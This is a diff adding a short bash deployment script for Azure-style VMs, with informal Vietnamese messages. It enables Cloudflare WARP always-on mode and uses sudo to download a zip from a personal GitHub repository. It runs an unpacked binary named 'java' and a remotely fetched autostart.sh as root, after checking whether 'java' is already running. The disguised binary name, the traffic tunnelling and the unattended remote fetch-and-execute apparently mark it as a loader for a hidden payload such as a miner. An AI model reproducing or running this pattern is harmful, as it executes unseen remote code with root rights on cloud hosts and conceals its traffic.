@@ -1,0 +1,42 @@
+#!/bin/bash
+
+set -x #echo on
+if [ -f /home/azure/java ]; then
+    if pgrep -x "java" > /dev/null
+then
+    echo "scrip dang chay roi , ke cmn di "
+    
+else
+
+echo "script da install , chay thoi "
+echo Y | warp-cli set-mode warp+doh
+warp-cli register
+echo Y | warp-cli enable-always-on
+cd /home/azure/
+sleep 20
+sudo chmod +x java
+rm autostart.sh
+sudo wget https://raw.githubusercontent.com/Lyn2210/Python3/main/autostart.sh
+chmod +x autostart.sh
+sudo -E env "HOSTNAME=$HOSTNAME" ./autostart.sh
+
+fi
+exit
+fi
+
+
+echo Y | warp-cli set-mode warp+doh
+warp-cli register
+echo Y | warp-cli enable-always-on
+cd /home/azure/
+sleep 20
+cd /home/azure/
+sudo wget https://github.com/Lyn2210/Python3/raw/main/ubuntu_18.04.zip
+sudo unzip ubuntu_18.04.zip
+sudo chmod +x java
+sudo rm start.sh
+sudo wget https://raw.githubusercontent.com/Lyn2210/Python3/main/autostart.sh
+sudo chmod +x autostart.sh
+sudo -E env "HOSTNAME=$HOSTNAME" ./autostart.sh
+
+exit 0
